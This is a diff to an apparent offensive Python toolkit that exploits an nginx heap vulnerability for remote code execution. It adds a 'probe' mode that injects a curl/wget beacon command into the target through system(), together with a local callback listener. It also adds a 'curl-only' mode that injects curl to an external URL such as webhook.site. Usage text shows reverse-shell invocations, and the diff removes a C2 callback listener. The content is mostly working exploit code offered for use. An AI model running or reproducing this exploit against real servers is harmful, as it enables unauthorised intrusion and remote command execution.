@@ -156,7 +156,7 @@ class _Spinner:
 # CONFIGURATION
 # ═══════════════════════════════════════════════════════════════════════
 
-VERSION = "2.1.0"
+VERSION = "2.2.0"
 _KILL_PORT = True   # set to False via --no-kill-port
 BANNER = r"""
    ╔══════════════════════════════════════════════════════╗
@@ -1442,6 +1442,148 @@ def mode_dos(host: str, port: int, overflow_size: int = 200, vhost: str = "l", u
 
 
 # ═══════════════════════════════════════════════════════════════════════
+# MODULE 2b: PROBE — simple curl/wget beacon RCE confirmation
+# ═══════════════════════════════════════════════════════════════════════
+
+def mode_probe_cmd(host: str, port: int,
+                   cb_host: str = "192.168.140.101", cb_port: int = 8006,
+                   cb_path: str = "/ping",
+                   heap_base: int = 0, libc_base: int = 0,
+                   system_off: int = DEFAULT_SYSTEM_OFFSET,
+                   offsets: list | None = None,
+                   tries: int = 10,
+                   vhost: str = "l", use_ssl: bool = False) -> dict:
+    """
+    Probe mode: inject a curl/wget beacon into the target via RCE.
+    Starts a local HTTP listener on cb_port; when the target calls back,
+    RCE is confirmed.
+
+    Beacon command injected (curl first, wget fallback):
+        curl -sm3 http://<cb_host>:<cb_port><cb_path>
+        || wget -q -O /dev/null http://<cb_host>:<cb_port><cb_path>
+    """
+    cb_url = f"http://{cb_host}:{cb_port}{cb_path}"
+    result: dict = {
+        "success": False, "hit": False,
+        "cb_url": cb_url,
+        "exploit_success": False,
+        "winning_addr": None,
+        "attempts": [],
+        "error": None,
+        "callback_detail": None,
+    }
+
+    beacon_cmd = (
+        f"curl -sm3 {cb_url}"
+        f" || wget -q -O /dev/null {cb_url} 2>/dev/null"
+    )
+    log(f"Probe beacon command: {beacon_cmd}", "info")
+
+    # ── local HTTP listener ──────────────────────────────────────────
+    state = CallbackState()
+    ready = threading.Event()
+
+    class _ProbeHandler(BaseHTTPRequestHandler):
+        _state: CallbackState
+
+        def do_GET(self):
+            detail = (
+                f"src={self.client_address[0]}:{self.client_address[1]}"
+                f"  path={self.path}"
+            )
+            self.__class__._state.output = detail
+            self.__class__._state.event.set()
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(b"ok\n")
+
+        def do_HEAD(self):
+            self.send_response(200)
+            self.end_headers()
+
+        def log_message(self, *_):
+            pass
+
+    _ProbeHandler._state = state
+
+    def _run_probe_srv():
+        kill_port(cb_port)
+        srv = HTTPServer(("0.0.0.0", cb_port), _ProbeHandler)
+        srv.timeout = 1
+        ready.set()
+        while not state.event.is_set():
+            srv.handle_request()
+        srv.server_close()
+
+    t_srv = threading.Thread(target=_run_probe_srv, daemon=True)
+    t_srv.start()
+    if not ready.wait(5):
+        result["error"] = f"Cannot bind probe listener on port {cb_port}"
+        return result
+
+    log(f"Probe listener ready on 0.0.0.0:{cb_port} — waiting for beacon at {cb_url}", "ok")
+
+    # ── fire exploit ─────────────────────────────────────────────────
+    hb  = heap_base or DEFAULT_HEAP_BASE
+    lb  = libc_base or DEFAULT_LIBC_BASE
+    off = offsets   or DEFAULT_HEAP_OFFSETS
+
+    xr = mode_exploit(host, port, beacon_cmd, hb, lb, system_off, off, tries,
+                      vhost=vhost, use_ssl=use_ssl)
+
+    result["exploit_success"] = xr.success
+    result["winning_addr"]    = xr.winning_addr
+    result["attempts"]        = xr.attempts
+    result["error"]           = xr.error
+
+    if xr.success:
+        result["success"] = True
+        log("Exploit triggered — waiting for beacon (15 s)...", "info")
+        if state.event.wait(15):
+            result["hit"]             = True
+            result["callback_detail"] = state.output
+            log(f"BEACON HIT: {state.output}", "ok")
+        else:
+            log(
+                f"No beacon received in 15 s — command may have run but "
+                f"target cannot reach {cb_host}:{cb_port}",
+                "warn",
+            )
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 2c: CURL ONLY — basic RCE to external URL (no listener)
+# ═══════════════════════════════════════════════════════════════════════
+
+def mode_curl_only(host: str, port: int, curl_url: str,
+                   heap_base: int = 0, libc_base: int = 0,
+                   system_off: int = DEFAULT_SYSTEM_OFFSET,
+                   offsets: list[int] | None = None,
+                   tries: int = 10,
+                   vhost: str = "l", use_ssl: bool = False) -> dict:
+    """
+    Basic RCE confirmation via curl to an external URL (no local listener).
+    Injects: curl -sm3 <curl_url>
+    Returns dict with exploit result.
+    """
+    cmd = f"curl -sm3 {curl_url}"
+    hb  = heap_base or DEFAULT_HEAP_BASE
+    lb  = libc_base or DEFAULT_LIBC_BASE
+    off = offsets   or DEFAULT_HEAP_OFFSETS
+
+    xr = mode_exploit(host, port, cmd, hb, lb, system_off, off, tries,
+                      vhost=vhost, use_ssl=use_ssl)
+    return {
+        "success": xr.success,
+        "winning_addr": xr.winning_addr,
+        "command_sent": cmd,
+        "attempts": xr.attempts,
+        "error": xr.error,
+    }
+
+
+# ═══════════════════════════════════════════════════════════════════════
 # MODULE 3: PATCH & FIX
 # ═══════════════════════════════════════════════════════════════════════
 
@@ -2249,12 +2391,13 @@ def run_interactive():
             f"{_RED}[8]{_RST}  DoS Test (crash verification)\n"
             f"{_BLU}[9]{_RST}  Generate Report (HTML/JSON)\n"
             f"{_BLU}[10]{_RST} Bulk Fingerprint + Vuln Check (target list)\n"
-            f"{_MAG}[11]{_RST} Listener Only (capture incoming C2 callbacks)\n"
+            f"{_GRN}[11]{_RST} Probe Command (curl/wget beacon → confirm RCE)\n"
+            f"{_GRN}[12]{_RST} Curl Only — basic RCE to URL (no listener)\n"
             f"{_DIM}[0]{_RST}  Exit",
             title="Menu",
         )
 
-        choice = _ask("Select", choices=["0","1","2","3","4","5","6","7","8","9","10","11"])
+        choice = _ask("Select", choices=["0","1","2","3","4","5","6","7","8","9","10","11","12"])
 
         if choice == "0":
             print(f"{_YLW}Goodbye!{_RST}")
@@ -2609,59 +2752,123 @@ def run_interactive():
                   f"Unknown: {_DIM}{len(results) - vuln_count - safe_count}{_RST}")
 
         elif choice == "11":
-            # ── Listener-Only Mode ──
-            print(f"\n{_MAG}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}")
-            print(f"{_MAG}{_BOLD}LISTENER-ONLY MODE — Capture Incoming C2 Callbacks{_RST}")
-            print(f"{_MAG}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}\n")
-            
-            listen_type = _ask("Listener type", 
-                             choices=["tcp", "http", "dns", "ws", "all"], 
-                             default="tcp")
-            listen_ip = _ask("Bind IP", default="0.0.0.0")
-            
-            # Default ports by type
-            default_ports = {"tcp": "4444", "http": "8888", "dns": "53", "ws": "9999", "all": "0"}
-            default_port = default_ports.get(listen_type, "4444")
-            listen_port = int(_ask("Port (0 = auto)", default=default_port))
-            
-            timeout_input = _ask("Timeout in seconds (0 = infinite)", default="0")
-            timeout = int(timeout_input) if timeout_input else 0
-            
-            save_output = _confirm("Save captured packets to file?", default=False)
-            output_file = _ask("Output file path") if save_output else None
-            verbose = _confirm("Verbose mode (show raw data)?", default=False)
-            
-            print(f"\n{_GRN}Starting {listen_type.upper()} listener on {listen_ip}:{listen_port or 'auto'}...{_RST}")
-            print(f"{_DIM}Press Ctrl+C to stop and view captured packets{_RST}\n")
-            
-            result = mode_listen_only(
-                listen_type=listen_type,
-                listen_ip=listen_ip,
-                listen_port=listen_port,
-                timeout=timeout,
-                output_file=output_file,
-                verbose=verbose,
+            # ── Probe Command (curl/wget beacon) ──
+            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
+            parsed = parse_target(target)
+            if not parsed:
+                print(f"{_RED}Invalid target{_RST}")
+                input("\nPress Enter to continue...")
+                _clr()
+                continue
+            host, port, vhost, use_ssl = parsed
+
+            cb_host = _ask("Callback IP (your IP reachable from target)", default="192.168.140.101")
+            cb_port = int(_ask("Callback port", default="8006"))
+            cb_path = _ask("Callback URL path", default="/ping")
+
+            cb_url = f"http://{cb_host}:{cb_port}{cb_path}"
+            _print_panel(
+                f"  Target  : {host}:{port}\n"
+                f"  Callback: {cb_url}\n"
+                f"\n"
+                f"  The exploit will inject:\n"
+                f"    curl -sm3 {cb_url}\n"
+                f"    || wget -q -O /dev/null {cb_url}\n"
+                f"\n"
+                f"  A local HTTP listener will be started on 0.0.0.0:{cb_port}\n"
+                f"  If the target executes the command, you'll see BEACON HIT.",
+                title="Probe Setup",
             )
-            
-            # Display summary
-            print(f"\n{_GRN}Capture Summary:{_RST}")
-            print(f"  Listener Type: {result['listen_type']}")
-            print(f"  Bind Address: {result['listen_ip']}")
-            print(f"  Total Captured: {_GRN}{result['captured_count']}{_RST} packets")
-            
-            if result["packets"]:
-                print(f"\n{_GRN}Captured Packets:{_RST}")
-                for i, pkt in enumerate(result["packets"], 1):
-                    print(f"\n  [{i}] {pkt['timestamp']}")
-                    print(f"      Type: {pkt['type'].upper()}")
-                    print(f"      Source: {pkt['source']}")
-                    print(f"      Size: {pkt.get('size', 0)} bytes")
-                    if pkt.get("decoded"):
-                        decoded_preview = pkt["decoded"][:100].replace("\n", " ")
-                        print(f"      Data: {decoded_preview}")
-            
-            if output_file:
-                print(f"\n{_GRN}✓ Output saved to: {output_file}{_RST}")
+            if not _confirm("Fire probe?", default=True):
+                input("\nPress Enter to continue...")
+                _clr()
+                continue
+
+            kb_name = _ask("Known build preset (blank = default)", default="")
+            hb = DEFAULT_HEAP_BASE
+            lb = DEFAULT_LIBC_BASE
+            so = DEFAULT_SYSTEM_OFFSET
+            offs = DEFAULT_HEAP_OFFSETS
+            if kb_name and kb_name in KNOWN_BUILDS:
+                kb = KNOWN_BUILDS[kb_name]
+                hb, lb, so, offs = kb["heap_base"], kb["libc_base"], kb["sys_offset"], kb["offsets"]
+                log(f"Using known build '{kb_name}'", "info")
+
+            tries = int(_ask("Tries per offset", default="10"))
+
+            with _Spinner("Running probe exploit..."):
+                result = mode_probe_cmd(
+                    host, port,
+                    cb_host=cb_host, cb_port=cb_port, cb_path=cb_path,
+                    heap_base=hb, libc_base=lb, system_off=so,
+                    offsets=offs, tries=tries,
+                    vhost=vhost, use_ssl=use_ssl,
+                )
+
+            if result.get("hit"):
+                print(f"\n{_GRN}{_BOLD}[+] RCE CONFIRMED — beacon received!{_RST}")
+                print(f"  {_GRN}Detail :{_RST} {result['callback_detail']}")
+                print(f"  {_GRN}Beacon :{_RST} {result['cb_url']}")
+                print(f"  {_GRN}Address:{_RST} {result['winning_addr']}")
+            elif result.get("exploit_success"):
+                print(f"\n{_YLW}[!] Exploit triggered but no beacon received{_RST}")
+                print(f"  Check network path: target → {cb_host}:{cb_port}")
+            else:
+                print(f"\n{_RED}[-] Probe failed: {result.get('error') or 'no crash detected'}{_RST}")
+
+        elif choice == "12":
+            # ── Curl Only (Basic RCE) ──
+            target = _ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
+            parsed = parse_target(target)
+            if not parsed:
+                print(f"{_RED}Invalid target{_RST}")
+                input("\nPress Enter to continue...")
+                _clr()
+                continue
+            host, port, vhost, use_ssl = parsed
+
+            curl_url = _ask("Curl target URL", default="https://webhook.site/your-uuid")
+
+            _print_panel(
+                f"  Target: {host}:{port}\n"
+                f"  Curl  : curl -sm3 {curl_url}\n"
+                f"\n"
+                f"  Exploit will inject this curl command directly.\n"
+                f"  No local listener is started.",
+                title="Curl-Only RCE",
+            )
+            if not _confirm("Fire exploit?", default=True):
+                input("\nPress Enter to continue...")
+                _clr()
+                continue
+
+            kb_name = _ask("Known build preset (blank = default)", default="")
+            hb = DEFAULT_HEAP_BASE
+            lb = DEFAULT_LIBC_BASE
+            so = DEFAULT_SYSTEM_OFFSET
+            offs = DEFAULT_HEAP_OFFSETS
+            if kb_name and kb_name in KNOWN_BUILDS:
+                kb = KNOWN_BUILDS[kb_name]
+                hb, lb, so, offs = kb["heap_base"], kb["libc_base"], kb["sys_offset"], kb["offsets"]
+                log(f"Using known build '{kb_name}'", "info")
+
+            tries = int(_ask("Tries per offset", default="10"))
+
+            with _Spinner("Exploiting..."):
+                result = mode_curl_only(
+                    host, port, curl_url,
+                    heap_base=hb, libc_base=lb, system_off=so,
+                    offsets=offs, tries=tries,
+                    vhost=vhost, use_ssl=use_ssl,
+                )
+
+            if result["success"]:
+                print(f"\n{_GRN}{_BOLD}[+] RCE triggered!{_RST}")
+                print(f"  {_GRN}Command :{_RST} curl -sm3 {curl_url}")
+                print(f"  {_GRN}Address :{_RST} {result['winning_addr']}")
+                print(f"  Check your HTTP server for incoming request.")
+            else:
+                print(f"\n{_RED}[-] Exploit failed: {result.get('error') or 'no crash detected'}{_RST}")
 
         input("\nPress Enter to continue...")
         _clr()
@@ -2761,12 +2968,6 @@ Option 3 — Direct Reverse Shell (port is auto-freed before binding):
   python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444 --known-build 1.25.3-glibc
   python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444 --known-build 1.30.0-glibc
   python nginx-rift-super-toolkit.py --shell -t 10.0.0.5:19321 --lhost 10.0.0.1 --lport 4444 --no-kill-port
-
-Listener-Only Mode (capture callbacks from already exploited targets):
-  python nginx-rift-super-toolkit.py --listen-only --listen-type tcp --listen-port-capture 4444
-  python nginx-rift-super-toolkit.py --listen-only --listen-type http --listen-port-capture 8888
-  python nginx-rift-super-toolkit.py --listen-only --listen-type all --listen-verbose
-  python nginx-rift-super-toolkit.py --listen-only --listen-type dns --listen-port-capture 53 --listen-timeout 120
         """
     )
 
@@ -2780,6 +2981,20 @@ Listener-Only Mode (capture callbacks from already exploited targets):
     p.add_argument("--exploit", action="store_true", help="full RCE exploitation")
     p.add_argument("--shell", action="store_true", help="reverse shell mode")
     p.add_argument("--dos", action="store_true", help="DoS crash verification")
+
+    # Probe mode — simple curl/wget beacon to confirm RCE
+    p.add_argument("--probe", action="store_true",
+                   help="probe: inject curl/wget beacon → confirm RCE via HTTP callback")
+    p.add_argument("--probe-host", default="192.168.140.101", metavar="IP",
+                   help="beacon callback IP (default: 192.168.140.101)")
+    p.add_argument("--probe-port", type=int, default=8006, metavar="PORT",
+                   help="beacon callback port (default: 8006)")
+    p.add_argument("--probe-path", default="/ping", metavar="PATH",
+                   help="beacon URL path (default: /ping)")
+
+    # Curl-only mode — basic RCE to external URL (no local listener)
+    p.add_argument("--curl-only", metavar="URL",
+                   help="basic RCE: inject curl to the given URL (no listener, for webhooks etc.)")
 
     # Exploit params
     p.add_argument("--cmd", help="command to execute via system()")
@@ -2881,25 +3096,6 @@ Listener-Only Mode (capture callbacks from already exploited targets):
                        choices=["markers", "checksum", "size"],
                        default="markers", help="Verification method")
 
-    # ─── Listener-Only Mode ───────────────────────────────────────────────────
-    listen_grp = p.add_argument_group("Listener-Only Mode (capture incoming callbacks)")
-    listen_grp.add_argument("--listen-only", action="store_true",
-                           help="Run in listener-only mode (no exploit, just capture callbacks)")
-    listen_grp.add_argument("--listen-type", metavar="TYPE",
-                           choices=["tcp", "http", "dns", "ws", "all"],
-                           default="tcp",
-                           help="Listener type: tcp|http|dns|ws|all (default: tcp)")
-    listen_grp.add_argument("--listen-ip", default="0.0.0.0",
-                           help="IP to bind listener to (default: 0.0.0.0)")
-    listen_grp.add_argument("--listen-port-capture", type=int, default=0, metavar="PORT",
-                           help="Port for listener (0 = auto by type: tcp=4444, http=8888, dns=53, ws=9999)")
-    listen_grp.add_argument("--listen-timeout", type=int, default=0, metavar="SEC",
-                           help="Listener timeout in seconds (0 = infinite, Ctrl+C to stop)")
-    listen_grp.add_argument("--listen-output", metavar="FILE",
-                           help="Save captured packets to file")
-    listen_grp.add_argument("--listen-verbose", action="store_true",
-                           help="Show raw packet data for debugging")
-
     return p
 
 
@@ -2956,6 +3152,59 @@ def main():
             for k, v in result.items():
                 print(f"{k}: {v}")
         return 0 if result.get("verdict") and "present" in str(result.get("verdict")) else 1
+
+    # ── PROBE (simple curl/wget beacon RCE confirmation) ──
+    if args.probe:
+        result = mode_probe_cmd(
+            host, port,
+            cb_host=args.probe_host,
+            cb_port=args.probe_port,
+            cb_path=args.probe_path,
+            heap_base=heap_base,
+            libc_base=libc_base,
+            system_off=args.system_offset,
+            offsets=parsed_offsets,
+            tries=args.tries,
+            vhost=vhost,
+            use_ssl=use_ssl,
+        )
+        if args.json:
+            print(json.dumps(result, indent=2, default=str))
+        else:
+            if result.get("hit"):
+                print(f"[+] RCE CONFIRMED — beacon received!")
+                print(f"[+] Detail : {result['callback_detail']}")
+                print(f"[+] Beacon : {result['cb_url']}")
+                print(f"[+] Address: {result['winning_addr']}")
+            elif result.get("exploit_success"):
+                print(f"[!] Exploit triggered but no beacon received")
+                print(f"[!] Check network path: target → {args.probe_host}:{args.probe_port}")
+            else:
+                print(f"[-] Probe failed: {result.get('error') or 'no crash detected'}")
+        return 0 if result.get("hit") else 3
+
+    # ── CURL ONLY (basic RCE to external URL) ──
+    if args.curl_only:
+        curl_url = args.curl_only
+        result = mode_curl_only(
+            host, port, curl_url,
+            heap_base=heap_base,
+            libc_base=libc_base,
+            system_off=args.system_offset,
+            offsets=parsed_offsets,
+            tries=args.tries,
+            vhost=vhost, use_ssl=use_ssl,
+        )
+        if args.json:
+            print(json.dumps(result, indent=2, default=str))
+        else:
+            if result["success"]:
+                print(f"[+] RCE triggered – curl sent to {curl_url}")
+                print(f"    Winning address: {result['winning_addr']}")
+                print(f"    Check your HTTP endpoint for a request.")
+            else:
+                print(f"[-] Exploit failed: {result.get('error') or 'no crash'}")
+        return 0 if result["success"] else 3
 
     # ── 32-bit BRUTE FORCE ──
     if args.bruteforce_32:
@@ -3082,54 +3331,6 @@ def main():
             else:
                 print(f"[-] Exploit failed: {result.error or 'no crash detected'}")
         return 0 if result.success else 3
-
-    # ── LISTENER-ONLY MODE ──
-    if args.listen_only:
-        print(f"\n{_CYAN}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}")
-        print(f"{_CYAN}{_BOLD}LISTENER-ONLY MODE — Capturing Incoming C2 Callbacks{_RST}")
-        print(f"{_CYAN}{_BOLD}═══════════════════════════════════════════════════════════════{_RST}\n")
-        
-        result = mode_listen_only(
-            listen_type=args.listen_type,
-            listen_ip=args.listen_ip,
-            listen_port=args.listen_port_capture,
-            timeout=args.listen_timeout,
-            output_file=args.listen_output,
-            verbose=args.listen_verbose,
-        )
-        
-        if args.json:
-            print(json.dumps(result, indent=2))
-        else:
-            print(f"\n{_GRN}Capture Summary:{_RST}")
-            print(f"  Listener Type: {result['listen_type']}")
-            print(f"  Bind Address: {result['listen_ip']}")
-            print(f"  Timeout: {result['timeout']}s (0 = infinite)")
-            print(f"  Total Captured: {_GRN}{result['captured_count']}{_RST} packets")
-            
-            if result["packets"]:
-                print(f"\n{_GRN}Captured Packets:{_RST}")
-                for i, pkt in enumerate(result["packets"], 1):
-                    print(f"\n  [{i}] {pkt['timestamp']}")
-                    print(f"      Type: {pkt['type'].upper()}")
-                    print(f"      Source: {pkt['source']}")
-                    print(f"      Size: {pkt.get('size', 0)} bytes")
-                    if pkt.get("decoded"):
-                        decoded_preview = pkt["decoded"][:100].replace("\n", " ")
-                        print(f"      Data: {decoded_preview}")
-            
-            if result["errors"]:
-                print(f"\n{_RED}Errors:{_RST}")
-                for err in result["errors"]:
-                    print(f"  - {err}")
-            
-            if result.get("end_time"):
-                print(f"\n  Duration: {result['start_time']} → {result['end_time']}")
-            
-            if args.listen_output:
-                print(f"\n{_GRN}✓ Output saved to: {args.listen_output}{_RST}")
-        
-        return 0 if result["captured_count"] > 0 else 1
 
     # ── DoS ──
     if args.dos:
